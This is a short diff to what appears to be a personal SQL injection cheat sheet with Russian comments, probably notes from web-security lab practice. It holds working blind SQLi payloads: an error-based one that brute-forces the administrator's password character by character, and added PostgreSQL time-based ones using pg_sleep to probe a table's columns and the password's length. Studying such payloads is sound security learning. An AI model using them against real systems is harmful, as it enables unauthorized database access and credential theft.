@@ -186,4 +186,14 @@ select * from User
 
         -перебор символов пароля
         '||(SELECT CASE WHEN SUBSTR(password,N,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
-       
+
+    # Time-Based Blind SQLi
+        -определение колонок
+        =as';SELECT CASE WHEN EXISTS(SELECT 1 FROM information_schema.columns WHERE table_name = 'products' AND column_name = 'id') THEN pg_sleep(5) ELSE pg_sleep(0) END--
+        -определение длинны пароля 
+        =x';SELECT CASE WHEN (username='administrator' AND LENGTH(password)>2) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM+users-- 
+
+    # Out-of-Band Blind SQLi
+
+    # Second-Order SQLi
+        
